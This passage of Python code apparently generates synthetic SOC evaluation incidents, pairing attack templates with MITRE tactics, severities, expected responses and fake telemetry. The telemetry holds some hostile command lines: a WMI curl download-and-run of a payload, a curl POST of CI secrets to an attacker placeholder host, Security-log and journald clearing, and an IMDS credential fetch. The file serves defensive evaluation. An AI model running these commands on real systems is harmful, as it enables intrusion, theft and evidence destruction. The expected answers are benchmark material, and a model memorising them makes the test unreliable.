                SubjectUserName="{user}",
                ObjectServer="DS",
                ObjectType="domainDNS",
                Properties="1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",  # DS-Replication-Get-Changes-All
                ClientIP="{host}",
            ),
        ),
    ),
    Template(
        template_id="saml-golden-ticket",
        title="SAML golden-ticket: forged assertion targeting {user}",
        description=(
            "Forged SAML assertion detected for {user}. Attacker pivoted to Azure AD; account "
            "enumeration followed from {ip}."
        ),
        tactics=("TA0006", "TA0007"),
        techniques=("T1606.002", "T1087.002"),
        severity="critical",
        response_class="disable_account",
        evidence_keywords=("saml", "golden ticket", "forged", "azure ad", "{user}", "{ip}"),
        placeholders=("user", "ip"),
        telemetry=(
            _azure_signin(
                userPrincipalName="{user}",
                ipAddress="{ip}",
                resultType=0,
                authenticationDetails=[{"authenticationMethod": "Federated", "succeeded": True}],
                tokenIssuerType="ADFederationServices",
                tokenIssuerName="forged-adfs.aisoc.dev",
            ),
            _m365(
                "Add member to role.",
                workload="AzureActiveDirectory",
                UserId="{user}",
                ModifiedProperties=[{"Name": "Role.DisplayName", "NewValue": "Global Administrator"}],
            ),
        ),
    ),
    # ─────────────────────────────────────────────────────────
    # Discovery (TA0007)
    # ─────────────────────────────────────────────────────────
    Template(
        template_id="ldap-bloodhound-discovery",
        title="Domain enumeration from {host}",
        description=(
            "ldap discovery from {host} by {user}: BloodHound-style queries enumerating users, "
            "groups, ACLs."
        ),
        tactics=("TA0007",),
        techniques=("T1087.002",),
        severity="medium",
        response_class="monitor",
        evidence_keywords=("ldap", "bloodhound", "domain enumeration", "{host}", "{user}"),
        placeholders=("host", "user"),
        telemetry=(
            _sysmon(
                3,
                Computer="{host}",
                Image="C:\\Tools\\SharpHound.exe",
                DestinationIp="WIN-DC-PRIMARY",
                DestinationPort=389,
                User="{user}",
            ),
            _winsec(
                4662,
                Computer="WIN-DC-PRIMARY",
                SubjectUserName="{user}",
                ObjectType="user",
                AccessMask="0x100",  # ControlAccess
                EventCount=8400,
            ),
        ),
    ),
    Template(
        template_id="smb-share-enumeration",
        title="Network share enumeration on {host}",
        description=(
            "Mass SMB share enumeration from {host} by {user}; net.exe and PowerShell Get-SmbShare "
            "invocations across /24 subnet."
        ),
        tactics=("TA0007",),
        techniques=("T1135",),
        severity="medium",
        response_class="monitor",
        evidence_keywords=("smb", "net.exe", "Get-SmbShare", "share enumeration", "{host}", "{user}"),
        placeholders=("host", "user"),
        telemetry=(
            _sysmon(
                1,
                Computer="{host}",
                User="{user}",
                Image="C:\\Windows\\System32\\net.exe",
                CommandLine="net.exe view /domain",
            ),
            _winsec(
                5145,
                Computer="WIN-FILE-SHARE",
                SubjectUserName="{user}",
                ShareName="\\\\*\\*",
                IpAddress="{host}",
                EventCount=256,
            ),
        ),
    ),
    # ─────────────────────────────────────────────────────────
    # Lateral Movement (TA0008)
    # ─────────────────────────────────────────────────────────
    Template(
        template_id="pass-the-hash-lateral",
        title="Pass-the-hash from {host} to {target_host}",
        description=(
            "Pass-the-hash lateral movement from {host} to {target_host} by {user}. Golden ticket "
            "indicators present. Linked to {campaign}."
        ),
        tactics=("TA0008", "TA0006"),
        techniques=("T1550.002", "T1558.001"),
        severity="critical",
        response_class="isolate_host",
        evidence_keywords=("pass-the-hash", "golden ticket", "{host}", "{target_host}", "{user}", "{campaign}"),
        placeholders=("host", "target_host", "user", "campaign"),
        telemetry=(
            _winsec(
                4624,
                Computer="{target_host}",
                TargetUserName="{user}",
                LogonType=3,
                AuthenticationPackageName="NTLM",
                IpAddress="{host}",
                LogonProcessName="NtLmSsp",
            ),
            _edr(
                "Pass-the-hash indicators (NTLM hash reuse)",
                Computer="{target_host}",
                Source="{host}",
                User="{user}",
                threat_actor="{campaign}",
            ),
        ),
    ),
    Template(
        template_id="rdp-lateral-movement",
        title="RDP lateral movement from {host}",
        description=(
            "Anomalous RDP session from {host} ({user}) to {target_host} outside business hours. "
            "Source admin not normal for {target_host}."
        ),
        tactics=("TA0008",),
        techniques=("T1021.001",),
        severity="high",
        response_class="isolate_host",
        evidence_keywords=("rdp", "lateral movement", "outside hours", "{host}", "{target_host}", "{user}"),
        placeholders=("host", "target_host", "user"),
        telemetry=(
            _winsec(
                4624,
                Computer="{target_host}",
                TargetUserName="{user}",
                LogonType=10,  # RemoteInteractive
                IpAddress="{host}",
                LogonProcessName="User32",
                EventTimeUTC="03:14:00Z",
            ),
        ),
    ),
    Template(
        template_id="wmi-lateral-execution",
        title="WMI lateral execution from {host} to {target_host}",
        description=(
            "wmic.exe /node:{target_host} process call create observed from {host} by {user}. "
            "Remote command execution; payload from {ip}."
        ),
        tactics=("TA0008", "TA0002"),
        techniques=("T1047",),
        severity="high",
        response_class="isolate_host",
        evidence_keywords=("wmic", "lateral", "{host}", "{target_host}", "{user}", "{ip}"),
        placeholders=("host", "target_host", "user", "ip"),
        telemetry=(
            _sysmon(
                1,
                Computer="{host}",
                User="{user}",
                Image="C:\\Windows\\System32\\wbem\\wmic.exe",
                CommandLine="wmic /node:{target_host} process call create \"cmd /c curl http://{ip}/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\"",
            ),
        ),
    ),
    # ─────────────────────────────────────────────────────────
    # Collection (TA0009)
    # ─────────────────────────────────────────────────────────
    Template(
        template_id="bulk-pii-download",
        title="Bulk PII download by {user}",
        description=(
            "{user} downloaded >10 GB of customer records from production database from {host}. "
            "Outside normal access pattern."
        ),
        tactics=("TA0009", "TA0010"),
        techniques=("T1005", "T1041"),
        severity="critical",
        response_class="disable_account",
        evidence_keywords=("bulk download", "pii", "customer record", "{host}", "{user}"),
        placeholders=("user", "host"),
        telemetry=(
            _db(
                "SELECT",
                user="{user}",
                src_host="{host}",
                database="prod_customers",
                table="customer_records",
                rows_returned=4_200_000,
                bytes=10_700_000_000,
            ),
        ),
    ),
    Template(
        template_id="clipboard-keylogger",
        title="Clipboard logging implant on {host}",
        description=(
            "Clipboard contents from {host} ({user}) being captured to %APPDATA%\\Local\\. "
            "Captures span 2 hours and include credentials and crypto addresses."
        ),
        tactics=("TA0009",),
        techniques=("T1115",),
        severity="high",
        response_class="isolate_host",
        evidence_keywords=("clipboard", "keylog", "credentials", "{host}", "{user}"),
        placeholders=("host", "user"),
        telemetry=(
            _sysmon(
                24,  # ClipboardChange
                Computer="{host}",
                User="{user}",
                Image="C:\\Users\\{user}\\AppData\\Local\\sched.exe",
                Hashes="SHA256=abc...",
            ),
            _sysmon(
                11,
                Computer="{host}",
                Image="C:\\Users\\{user}\\AppData\\Local\\sched.exe",
                TargetFilename="C:\\Users\\{user}\\AppData\\Local\\clip.log",
                User="{user}",
            ),
        ),
    ),
    # ─────────────────────────────────────────────────────────
    # Exfiltration (TA0010)
    # ─────────────────────────────────────────────────────────
    Template(
        template_id="dns-tunnel-exfil",
        title="DNS tunnelling exfiltration from {host}",
        description=(
            "DNS query volume from {host} 50× baseline. TXT records contain base64-encoded "
            "payloads. Estimated exfil ~200 MB; destination {ip}."
        ),
        tactics=("TA0011", "TA0010"),
        techniques=("T1071.004", "T1048.003"),
        severity="critical",
        response_class="isolate_host",
        evidence_keywords=("dns tunnel", "txt records", "base64", "exfiltrat", "{host}", "{ip}"),
        placeholders=("host", "ip"),
        telemetry=(
            _dns(
                qname="aGVsbG8gd29ybGQK.exfil.{ip}.in-addr.arpa",
                qtype="TXT",
                src_host="{host}",
                dst_ip="{ip}",
                response_size=512,
                qps=240,
            ),
        ),
    ),
    Template(
        template_id="s3-exfil-cloud-storage",
        title="Cloud storage exfil: data egress to attacker-controlled S3 from {host}",
        description=(
            "Egress from {host} to s3://atk-stage-{ip}/dump/ by {user}. 8 GB transferred over 20 "
            "minutes. CloudTrail PutObject events match."
        ),
        tactics=("TA0010",),
        techniques=("T1567.002",),
        severity="critical",
        response_class="block_indicator",
        evidence_keywords=("s3", "cloud storage", "egress", "exfiltrat", "{host}", "{ip}", "{user}"),
        placeholders=("host", "ip", "user"),
        telemetry=(
            _cloudtrail(
                "PutObject",
                event_source="s3.amazonaws.com",
                userIdentity={"type": "IAMUser", "userName": "{user}"},
                sourceIPAddress="{host}",
                requestParameters={"bucketName": "atk-stage-{ip}", "key": "dump/customers.tar.gz"},
                resources=[{"ARN": "arn:aws:s3:::atk-stage-{ip}/dump/customers.tar.gz"}],
            ),
        ),
    ),
    Template(
        template_id="personal-drive-exfil",
        title="Personal Drive exfil by {user}",
        description=(
            "{user} on {host} uploaded 4 GB to personal Google Drive. Files include source code "
            "and customer PII."
        ),
        tactics=("TA0009", "TA0010"),
        techniques=("T1567.002", "T1005"),
        severity="critical",
        response_class="disable_account",
        evidence_keywords=("google drive", "personal", "exfiltrat", "source code", "pii", "{host}", "{user}"),
        placeholders=("user", "host"),
        telemetry=(
            _web(
                "POST",
                url="https://www.googleapis.com/upload/drive/v3/files",
                status=200,
                src_host="{host}",
                src_user="{user}",
                bytes_out=4_300_000_000,
                file_count=812,
            ),
        ),
    ),
    # ─────────────────────────────────────────────────────────
    # Command and Control (TA0011)
    # ─────────────────────────────────────────────────────────
    Template(
        template_id="dga-c2",
        title="DGA-based C2 traffic from {host}",
        description=(
            "DGA traffic from {host} observed; 200+ NXDomain replies/min, IoCs match {campaign} "
            "epoch 5. Beacons to {ip}."
        ),
        tactics=("TA0011",),
        techniques=("T1568.002",),
        severity="high",
        response_class="block_indicator",
        evidence_keywords=("dga", "domain generation", "nxdomain", "beacon", "{host}", "{ip}", "{campaign}"),
        placeholders=("host", "ip", "campaign"),
        telemetry=(
            _dns(
                qname="qkz3pl4vnxq2.com",
                qtype="A",
                src_host="{host}",
                rcode="NXDOMAIN",
                qps_above_baseline=50.0,
            ),
            _sysmon(
                3,
                Computer="{host}",
                Image="C:\\Windows\\System32\\svchost.exe",
                DestinationIp="{ip}",
                DestinationPort=443,
                Protocol="tcp",
                threat_actor="{campaign}",
            ),
        ),
    ),
    Template(
        template_id="https-c2-beacon",
        title="HTTPS C2 beacon from {host} to {ip}",
        description=(
            "Periodic HTTPS beacon from {host} to {ip} every 60 seconds with low jitter. JA3 "
            "fingerprint matches Cobalt Strike."
        ),
        tactics=("TA0011",),
        techniques=("T1071.001",),
        severity="critical",
        response_class="block_indicator",
        evidence_keywords=("c2", "beacon", "ja3", "Cobalt Strike", "{host}", "{ip}"),
        placeholders=("host", "ip"),
        telemetry=(
            _sysmon(
                3,
                Computer="{host}",
                DestinationIp="{ip}",
                DestinationPort=443,
                Protocol="tcp",
                ja3="a0e9f5d64349fb13191bc781f81f42e1",
                interval_secs=60,
                jitter_pct=2,
            ),
        ),
    ),
    # ─────────────────────────────────────────────────────────
    # Impact (TA0040)
    # ─────────────────────────────────────────────────────────
    Template(
        template_id="ransomware-encryption",
        title="Ransomware encryption in progress on {host}",
        description=(
            "Mass file rename observed on {host} ({user}); .{ext} extension applied to ~20 k "
            "files. Ransomware note R3ADM3-{campaign}.txt found."
        ),
        tactics=("TA0040",),
        techniques=("T1486",),
        severity="critical",
        response_class="isolate_host",
        evidence_keywords=("ransomware", "encrypt", "rename", "ransom note", "{host}", "{user}", "{campaign}"),
        placeholders=("host", "user", "ext", "campaign"),
        telemetry=(
            _sysmon(
                11,
                Computer="{host}",
                Image="C:\\ProgramData\\enc.exe",
                TargetFilename="C:\\Users\\{user}\\Documents\\notes.docx{ext}",
                User="{user}",
                rename_rate_per_min=4200,
            ),
            _sysmon(
                11,
                Computer="{host}",
                Image="C:\\ProgramData\\enc.exe",
                TargetFilename="C:\\Users\\{user}\\Desktop\\R3ADM3-{campaign}.txt",
                User="{user}",
            ),
            _edr(
                "Ransomware behaviour: high-rate file rename + ransom note",
                Computer="{host}",
                threat_actor="{campaign}",
                severity="critical",
            ),
        ),
    ),
    Template(
        template_id="xmrig-cryptominer",
        title="Cryptominer execution on {host}",
        description=(
            "XMRig miner spawned on {host}; CPU saturated to 95%. Mining pool {ip}:5555. Linked "
            "to {campaign}."
        ),
        tactics=("TA0002", "TA0040"),
        techniques=("T1496",),
        severity="medium",
        response_class="isolate_host",
        evidence_keywords=("xmrig", "miner", "cryptomine", "{host}", "{ip}", "{campaign}"),
        placeholders=("host", "ip", "campaign"),
        telemetry=(
            _auditd(
                "execve",
                exe="/tmp/xmrig",
                a0="xmrig",
                a1="-o",
                a2="{ip}:5555",
                hostname="{host}",
                cpu_pct=95,
            ),
        ),
    ),
    Template(
        template_id="bec-wire-fraud",
        title="BEC: payment redirect by {user}",
        description=(
            "Spear-phishing email spoofed CFO. Wire transfer of $250 k initiated by {user} from "
            "{host} to threat-actor account. Linked to {campaign}."
        ),
        tactics=("TA0001", "TA0040"),
        techniques=("T1566.001", "T1657"),
        severity="critical",
        response_class="escalate",
        evidence_keywords=("phishing", "spoofed cfo", "wire transfer", "$250", "{user}", "{host}", "{campaign}"),
        placeholders=("user", "host", "campaign"),
        telemetry=(
            _m365(
                "Send",
                workload="Exchange",
                UserId="{user}",
                ClientIP="{host}",
                Subject="URGENT: Wire instructions from CFO",
                From="cfo@aisoc.dev.spoof",
                ReplyTo="cfo-aisoc@protonmail.com",
                threat_actor="{campaign}",
            ),
        ),
    ),
    # ─────────────────────────────────────────────────────────
    # Cloud / Identity / Mobile / Misc
    # ─────────────────────────────────────────────────────────
    Template(
        template_id="public-s3-bucket-pii",
        title="Public S3 bucket exposing PII",
        description=(
            "S3 bucket world-readable; ~40k employee records accessible. CloudTrail shows external "
            "enumeration from {ip}."
        ),
        tactics=("TA0009", "TA0010"),
        techniques=("T1530", "T1567.002"),
        severity="critical",
        response_class="rollback_change",
        evidence_keywords=("s3", "public bucket", "pii", "cloudtrail", "{ip}"),
        placeholders=("ip",),
        telemetry=(
            _cloudtrail(
                "PutBucketAcl",
                event_source="s3.amazonaws.com",
                userIdentity={"type": "IAMUser", "userName": "ops-lead@aisoc.dev"},
                requestParameters={"bucketName": "aisoc-employees", "AccessControlPolicy": {"Grants": [{"Grantee": "AllUsers", "Permission": "READ"}]}},
            ),
            _cloudtrail(
                "ListObjectsV2",
                event_source="s3.amazonaws.com",
                sourceIPAddress="{ip}",
                requestParameters={"bucketName": "aisoc-employees", "max-keys": 1000},
                userIdentity={"type": "AnonymousUser"},
            ),
        ),
    ),
    Template(
        template_id="azure-ad-impossible-travel",
        title="Identity provider compromise — anomalous Azure AD sign-in for {user}",
        description=(
            "Successful Azure AD sign-in for {user} from {ip} (impossible-travel from prior "
            "location). MFA satisfied via stolen session token."
        ),
        tactics=("TA0001", "TA0006"),
        techniques=("T1078.004", "T1550.001"),
        severity="critical",
        response_class="disable_account",
        evidence_keywords=("azure ad", "impossible travel", "session token", "mfa", "{user}", "{ip}"),
        placeholders=("user", "ip"),
        telemetry=(
            _azure_signin(
                userPrincipalName="{user}",
                ipAddress="{ip}",
                location={"city": "Vladivostok", "countryOrRegion": "RU"},
                resultType=0,
                authenticationDetails=[{"authenticationMethod": "Previously satisfied", "succeeded": True}],
                riskEventTypes=["unfamiliarFeatures", "unlikelyTravel"],
                riskLevelAggregated="high",
            ),
        ),
    ),
    Template(
        template_id="ddos-syn-flood",
        title="DDoS volumetric flood targeting public-facing {host}",
        description=(
            "L4 SYN flood from a botnet (>1M PPS) targeting {host}. Edge mitigation engaged but "
            "service degraded for 12 minutes."
        ),
        tactics=("TA0040",),
        techniques=("T1498.001",),
        severity="high",
        response_class="block_indicator",
        evidence_keywords=("ddos", "syn flood", "botnet", "{host}", "1M PPS"),
        placeholders=("host",),
        telemetry=(
            _web(
                "GET",
                url="https://{host}/",
                status=503,
                pps=1_120_000,
                packet_type="TCP-SYN",
                edge_mitigation="engaged",
                duration_secs=720,
            ),
        ),
    ),
    Template(
        template_id="insider-mailbox-export",
        title="Insider preparing departure: large mailbox export by {user}",
        description=(
            "{user} exported full mailbox PST (8 GB) from {host}. HR flag: notice given last "
            "week."
        ),
        tactics=("TA0009", "TA0010"),
        techniques=("T1114.002", "T1567.002"),
        severity="high",
        response_class="disable_account",
        evidence_keywords=("mailbox export", "PST", "insider", "departure", "{user}", "{host}"),
        placeholders=("user", "host"),
        telemetry=(
            _m365(
                "New-MailboxExportRequest",
                workload="Exchange",
                UserId="{user}",
                Parameters={"Mailbox": "{user}", "FilePath": "\\\\{host}\\export\\{user}.pst"},
                Bytes=8_300_000_000,
            ),
        ),
    ),
    Template(
        template_id="office-vsto-addin",
        title="Malicious Office add-in installed for {user}",
        description=(
            "Office VSTO add-in registered under HKCU for {user} on {host}; loads on every Outlook "
            "startup; beacons to {ip}."
        ),
        tactics=("TA0003", "TA0011"),
        techniques=("T1137.006", "T1071.001"),
        severity="high",
        response_class="rollback_change",
        evidence_keywords=("office add-in", "vsto", "outlook", "{user}", "{host}", "{ip}"),
        placeholders=("user", "host", "ip"),
        telemetry=(
            _sysmon(
                13,
                Computer="{host}",
                User="{user}",
                EventType="SetValue",
                TargetObject="HKCU\\Software\\Microsoft\\Office\\Outlook\\Addins\\Aisoc.Updater",
                Details="LoadBehavior=3;Manifest=file:///C:/Users/{user}/AppData/Roaming/aisoc.vsto",
            ),
            _sysmon(
                3,
                Computer="{host}",
                Image="C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                DestinationIp="{ip}",
                DestinationPort=443,
            ),
        ),
    ),
    Template(
        template_id="github-pat-leak",
        title="GitHub PAT leaked and abused from {ip}",
        description=(
            "Personal access token belonging to {user} used from {ip} to clone 14 private repos. "
            "Token committed in public dotfiles repo 6 hours earlier."
        ),
        tactics=("TA0006", "TA0009"),
        techniques=("T1552.001", "T1213.003"),
        severity="critical",
        response_class="disable_account",
        evidence_keywords=("github", "pat", "token", "private repo", "{user}", "{ip}"),
        placeholders=("user", "ip"),
        telemetry=(
            _github(
                "git.clone",
                actor="{user}",
                actor_ip="{ip}",
                repo_count=14,
                programmatic_access_type="personal_access_token",
                user_agent="git/2.40.0",
            ),
            _github(
                "push",
                actor="{user}",
                repo="{user}/dotfiles",
                visibility="public",
                file_changed=".env",
                secret_detected="github_pat_*",
            ),
        ),
    ),
    Template(
        template_id="ec2-imds-credential-theft",
        title="EC2 instance metadata service abused on {host}",
        description=(
            "IMDSv1 abused on {host}; temporary IAM credentials for role exfilled to {ip}. "
            "CloudTrail shows AssumeRole from external."
        ),
        tactics=("TA0006", "TA0004"),
        techniques=("T1552.005", "T1078.004"),
        severity="critical",
        response_class="rollback_change",
        evidence_keywords=("imds", "metadata", "iam credentials", "AssumeRole", "{host}", "{ip}"),
        placeholders=("host", "ip"),
        telemetry=(
            _web(
                "GET",
                url="http://169.254.169.254/latest/meta-data/iam/security-credentials/role-app",
                status=200,
                src_host="{host}",
                imds_version="v1",
            ),
            _cloudtrail(
                "AssumeRole",
                event_source="sts.amazonaws.com",
                sourceIPAddress="{ip}",
                userIdentity={"type": "AssumedRole", "principalId": "AIDA:role-app", "arn": "arn:aws:sts::123456789012:assumed-role/role-app/i-0abc"},
                userAgent="aws-cli/2.13",
            ),
        ),
    ),
    Template(
        template_id="helpdesk-password-reset-abuse",
        title="Vendor admin password reset abuse for {user}",
        description=(
            "Password reset for {user} performed by helpdesk in response to social-engineering "
            "call from {ip}. Token claimed within 90 seconds."
        ),
        tactics=("TA0001", "TA0006"),
        techniques=("T1566.004", "T1078"),
        severity="high",
        response_class="disable_account",
        evidence_keywords=("password reset", "social engineering", "helpdesk", "{user}", "{ip}"),
        placeholders=("user", "ip"),
        telemetry=(
            _m365(
                "Reset user password.",
                workload="AzureActiveDirectory",
                UserId="helpdesk@aisoc.dev",
                TargetUserId="{user}",
                ClientIP="10.0.0.50",
            ),
            _azure_signin(
                userPrincipalName="{user}",
                ipAddress="{ip}",
                resultType=0,
                seconds_after_reset=87,
            ),
        ),
    ),
    Template(
        template_id="oauth-refresh-token-theft",
        title="OAuth refresh-token theft for {user}",
        description=(
            "Refresh token for {user} replayed from {ip}. Granted access to mailbox + "
            "OneDrive without re-prompt."
        ),
        tactics=("TA0006",),
        techniques=("T1550.001",),
        severity="high",
        response_class="disable_account",
        evidence_keywords=("oauth", "refresh token", "replay", "onedrive", "mailbox", "{user}", "{ip}"),
        placeholders=("user", "ip"),
        telemetry=(
            _azure_signin(
                userPrincipalName="{user}",
                ipAddress="{ip}",
                resultType=0,
                authenticationProtocol="oAuth2",
                grantType="refresh_token",
                resourceDisplayName="Microsoft Graph",
            ),
        ),
    ),
    Template(
        template_id="malicious-container-image",
        title="Container image with embedded backdoor pulled by {host}",
        description=(
            "Image registry/repo:malicious-backdoor pulled by {host}. Layer scan flagged "
            "embedded netcat reverse-shell binary."
        ),
        tactics=("TA0001", "TA0002"),
        techniques=("T1195.002", "T1610"),
        severity="high",
        response_class="rollback_change",
        evidence_keywords=("container image", "registry", "backdoor", "netcat", "{host}"),
        placeholders=("host",),
        telemetry=(
            _k8s(
                "create",
                resource="pods",
                user={"username": "system:serviceaccount:default:deploy"},
                requestObject={"spec": {"containers": [{"image": "registry.local/repo:malicious-backdoor"}]}},
                node="{host}",
            ),
            _edr(
                "Image scan: embedded netcat reverse-shell binary",
                Computer="{host}",
                image="registry.local/repo:malicious-backdoor",
                cve_layer_count=2,
            ),
        ),
    ),
    Template(
        template_id="outlook-auto-forward-rule",
        title="Outlook rule auto-forwarding mail from {user}",
        description=(
            "Outlook inbox rule created for {user} that forwards all mail to external address at "
            "{ip}. Linked to {campaign}."
        ),
        tactics=("TA0006", "TA0009"),
        techniques=("T1564.008", "T1114.003"),
        severity="high",
        response_class="disable_account",
        evidence_keywords=("outlook rule", "forward", "mail", "{user}", "{ip}", "{campaign}"),
        placeholders=("user", "ip", "campaign"),
        telemetry=(
            _m365(
                "New-InboxRule",
                workload="Exchange",
                UserId="{user}",
                Parameters={
                    "Name": "Sync",
                    "ForwardTo": "ext@{ip}",
                    "DeleteMessage": True,
                    "MarkAsRead": True,
                },
                threat_actor="{campaign}",
            ),
        ),
    ),
    Template(
        template_id="linux-journald-tampering",
        title="Linux journald log tampering on {host}",
        description=(
            "journalctl --rotate --vacuum-time=1s observed on {host} by {user}; recent journal "
            "entries purged. Indicator removal."
        ),
        tactics=("TA0005",),
        techniques=("T1070.002",),
        severity="high",
        response_class="escalate",
        evidence_keywords=("journalctl", "log tampering", "vacuum", "{host}", "{user}"),
        placeholders=("host", "user"),
        telemetry=(
            _auditd(
                "execve",
                exe="/usr/bin/journalctl",
                a0="journalctl",
                a1="--rotate",
                a2="--vacuum-time=1s",
                hostname="{host}",
                user="{user}",
            ),
        ),
    ),
    Template(
        template_id="compromised-ci-runner",
        title="Compromised CI runner on {host} pushing to production",
        description=(
            "Self-hosted CI runner {host} compromised. Job triggered from PR injected secret "
            "exfil step; secrets posted to {ip}."
        ),
        tactics=("TA0001", "TA0006", "TA0010"),
        techniques=("T1195.002", "T1552.004"),
        severity="critical",
        response_class="rollback_change",
        evidence_keywords=("ci runner", "self-hosted", "secret", "exfil", "{host}", "{ip}"),
        placeholders=("host", "ip"),
        telemetry=(
            _github(
                "workflow_run.requested",
                workflow="deploy.yml",
                actor="external-contrib",
                repository="aisoc/web",
                event="pull_request",
                runner="{host}",
            ),
            _auditd(
                "execve",
                exe="/usr/bin/curl",
                a1="-X", a2="POST",
                a3="https://{ip}/exfil",
                hostname="{host}",
                user="ci-runner",
                secret_detected=True,
            ),
        ),
    ),
    Template(
        template_id="vpn-new-geography",
        title="Suspicious VPN login from new geography for {user}",
        description=(
            "VPN login for {user} from {ip} (new country, no prior history). Subsequent "
            "lateral SMB scan from VPN range to {host}."
        ),
        tactics=("TA0001", "TA0008"),
        techniques=("T1078.004", "T1021.002"),
        severity="high",
        response_class="disable_account",
        evidence_keywords=("vpn", "new geography", "lateral", "smb scan", "{user}", "{ip}", "{host}"),
        placeholders=("user", "ip", "host"),
        telemetry=(
            _vpn(
                "login_success",
                user="{user}",
                src_ip="{ip}",
                geo_country="UA",
                first_login_country=True,
            ),
            _winsec(
                5145,
                Computer="{host}",
                SubjectUserName="{user}",
                ShareName="\\\\*\\IPC$",
                IpAddress="{ip}",
                EventCount=128,
            ),
        ),
    ),
    Template(
        template_id="service-account-privileged-command",
        title="Privileged command run as service account on {host}",
        description=(
            "Service account {user} (no interactive use expected) ran privileged net.exe + "
            "wevtutil cl Security on {host}. Anomalous."
        ),
        tactics=("TA0005", "TA0006"),
        techniques=("T1078.001", "T1070.001"),
        severity="high",
        response_class="disable_account",
        evidence_keywords=("service account", "wevtutil", "log clear", "{user}", "{host}"),
        placeholders=("user", "host"),
        telemetry=(
            _sysmon(
                1,
                Computer="{host}",
                User="{user}",
                Image="C:\\Windows\\System32\\wevtutil.exe",
                CommandLine="wevtutil cl Security",
                LogonType=5,  # Service
            ),
        ),
    ),
]


# ---------------------------------------------------------------------------
# Deterministic generation
# ---------------------------------------------------------------------------

def _seed_index(index: int, salt: str) -> int:
    """Stable per-(index, salt) integer derived from SHA256."""
    h = hashlib.sha256(f"{index}-{salt}".encode()).hexdigest()
    return int(h[:8], 16)


def _pick(pool: list[str], index: int, salt: str) -> str:
    """Deterministically pick one item from `pool`."""
    return pool[_seed_index(index, salt) % len(pool)]


def _resolve_placeholders(template: Template, index: int) -> dict[str, str]:
    """Build a deterministic substitution dict for one incident."""
    pool_map = {
        "host": HOSTNAMES,
        "target_host": HOSTNAMES,
        "user": USERS,
        "ip": ATTACKER_IPS,
        "campaign": CAMPAIGNS,
        "ext": [".locked", ".aisocrypt", ".pwned", ".enc", ".tooktdata"],
    }
    subs: dict[str, str] = {}
    for ph in template.placeholders:
        salt = f"{template.template_id}|{ph}"
        subs[ph] = _pick(pool_map[ph], index, salt)
    # If the template references {target_host} ensure it differs from {host}
    if "target_host" in subs and subs.get("host") == subs.get("target_host"):
        target_idx = (HOSTNAMES.index(subs["target_host"]) + 1) % len(HOSTNAMES)
        subs["target_host"] = HOSTNAMES[target_idx]
    return subs


def _format_str(text: str, subs: dict[str, str]) -> str:
    """Format `text`, leaving unresolved placeholders alone (no KeyError)."""
    out = text
    for k, v in subs.items():
        out = out.replace("{" + k + "}", str(v))
    return out


def _resolve_value(value: Any, subs: dict[str, str]) -> Any:
    """
    Recursively resolve {placeholder} tokens inside strings, lists and dicts.

    Non-string scalars (int, float, bool, None) are passed through unchanged.
    Dict values are resolved; dict keys are NOT resolved (we don't expect
    placeholder keys in canonical telemetry shapes).
    """
    if isinstance(value, str):
        return _format_str(value, subs)
    if isinstance(value, list):
        return [_resolve_value(v, subs) for v in value]
    if isinstance(value, tuple):
        return tuple(_resolve_value(v, subs) for v in value)
    if isinstance(value, dict):
        return {k: _resolve_value(v, subs) for k, v in value.items()}
    return value


def _expand_evidence(keywords: tuple[str, ...], subs: dict[str, str]) -> list[str]:
    """Resolve placeholder evidence keywords against `subs`."""
    return [_format_str(k, subs) for k in keywords]


def _resolve_telemetry(events: tuple[dict[str, Any], ...], subs: dict[str, str]) -> list[dict[str, Any]]:
    """Resolve every event in a template's telemetry tuple."""
    return [_resolve_value(ev, subs) for ev in events]


def generate_incidents(count: int) -> list[dict[str, Any]]:
    """Generate `count` deterministic incidents by cycling through templates.

    Re-running with the same `count` and template/telemetry data yields
    byte-identical output.
    """
    if not TEMPLATES:
        raise RuntimeError("No templates defined.")
    # Stable id check: catch typos / duplicates early.
    seen_ids: set[str] = set()
    for tpl in TEMPLATES:
        if tpl.template_id in seen_ids:
            raise RuntimeError(f"Duplicate template_id detected: {tpl.template_id}")
        seen_ids.add(tpl.template_id)

    incidents: list[dict[str, Any]] = []
    for i in range(count):
        template_index = i % len(TEMPLATES)
        tpl = TEMPLATES[template_index]
        subs = _resolve_placeholders(tpl, i)
        title = _format_str(tpl.title, subs)
        description = _format_str(tpl.description, subs)
        evidence = _expand_evidence(tpl.evidence_keywords, subs)
        telemetry = _resolve_telemetry(tpl.telemetry, subs)
        incidents.append(
            {
                "id": f"INC-EVAL-{i + 1:03d}",
                "template_id": tpl.template_id,
                "template_index": template_index,
                "title": title,
                "description": description,
                "expected_tactics": list(tpl.tactics),
                "expected_techniques": list(tpl.techniques),
                "severity": tpl.severity,
                "response_class": tpl.response_class,
                "evidence_keywords": evidence,
                "telemetry": telemetry,
            }
        )
    return incidents


def write_telemetry_jsonl(incidents: list[dict[str, Any]], path: Path) -> int:
    """Write one event per line annotated with incident_id/template_id/event_index."""
    n = 0
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as fh:
        for inc in incidents:
            for j, ev in enumerate(inc.get("telemetry", [])):
                row = {
                    "incident_id": inc["id"],
                    "template_id": inc["template_id"],
                    "event_index": j,
                    **ev,
                }
                fh.write(json.dumps(row, sort_keys=False) + "\n")
                n += 1
    return n


def coverage_report(incidents: list[dict[str, Any]]) -> dict[str, Any]:
    """Summarize MITRE / template / telemetry coverage of the generated set."""
    tactic_counts: dict[str, int] = {}
    technique_counts: dict[str, int] = {}
    severity_counts: dict[str, int] = {}
    response_counts: dict[str, int] = {}
    template_counts: dict[str, int] = {}
    telemetry_source_counts: dict[str, int] = {}
    incidents_with_telemetry = 0
    for inc in incidents:
        for t in inc["expected_tactics"]:
            tactic_counts[t] = tactic_counts.get(t, 0) + 1
        for tech in inc["expected_techniques"]:
            technique_counts[tech] = technique_counts.get(tech, 0) + 1
        severity_counts[inc["severity"]] = severity_counts.get(inc["severity"], 0) + 1
        response_counts[inc["response_class"]] = response_counts.get(inc["response_class"], 0) + 1
        template_counts[inc["template_id"]] = template_counts.get(inc["template_id"], 0) + 1
        events = inc.get("telemetry", [])
        if events:
            incidents_with_telemetry += 1
        for ev in events:
            src = ev.get("source", "unknown")
            telemetry_source_counts[src] = telemetry_source_counts.get(src, 0) + 1
    return {
        "total": len(incidents),
        "unique_titles": len({inc["title"] for inc in incidents}),
        "unique_templates": len(template_counts),
        "incidents_with_telemetry": incidents_with_telemetry,
